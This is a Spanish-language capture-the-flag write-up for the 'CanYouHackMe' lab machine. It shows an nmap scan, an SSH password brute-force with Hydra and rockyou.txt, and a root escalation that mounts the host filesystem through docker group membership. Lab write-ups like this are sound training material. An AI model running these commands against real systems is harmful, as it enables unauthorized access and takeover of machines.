# CTF-Can-You-Hack-Me
# Solución de Maquinas Virtuales


# <img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/8af4fdfc-5b36-4846-8567-df6c3ced436c" />


# Descripción
- Detección de pista en el código fuente que sugiere cambiar la contraseña
- Fuerza bruta de contraseña con Hydra, obteniendo acceso por SSH
- Al ingresar, somos parte del grupo docker, lo que permite:
- Montar un contenedor temporal como root en /mnt
- Asignar permisos de root a bash dentro del contenedor
- Salir y ejecutar bash como root en el sistema host

# Métricas Técnicas
- Realismo
- Originalidad
- Escabilidad
- Intrusión
- CVE
- Aprendizaje

# Escaneo de Red

</> Bash

nmap -sS -sC -sV -p- --open -vvv -n Pn ip_objetivo

#

# <img width="682" height="255" alt="image" src="https://github.com/user-attachments/assets/385a23b4-b979-4cfb-99c7-2077714adffb" />


# Enumeración

</> Bash 

sudo nano /etc/host

ip_objetivo canyouhackme.thl
#

# <img width="683" height="404" alt="image" src="https://github.com/user-attachments/assets/4e6f3e6e-98c6-4ba0-b8e1-3f46ce82f354" />

Código fuente

# <img width="674" height="168" alt="image" src="https://github.com/user-attachments/assets/a1b7320f-42f6-4eeb-9626-2cf427fb91c4" />
#

# Explotación

</> Bash

hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://ip_objetivo
#

# <img width="674" height="82" alt="image" src="https://github.com/user-attachments/assets/b4807c20-4510-46fe-818c-585c9fb0ae96" />
#

</> Bash

ssh juan@ip_objetivo
#

User flag: xxxxxxxxxxxxxx

# Escalada de Privilegio

</> BAsh

juan@TheHackersLabs-CanYouHackMe:$ id
#

# <img width="590" height="38" alt="image" src="https://github.com/user-attachments/assets/35255059-2f8c-4931-9fab-e7dc7758a01e" />
#

</> Bash

docker run -v /:/mnt --rm -it alpine chroot /mnt bash
#

# <img width="745" height="76" alt="image" src="https://github.com/user-attachments/assets/b86ad86d-5d98-4366-98c9-c23aaa824b01" />
#

Root flag: xxxxxxxxxxxxxxx
#


# Elaborado por: Mgter. Sergio Bermúdez










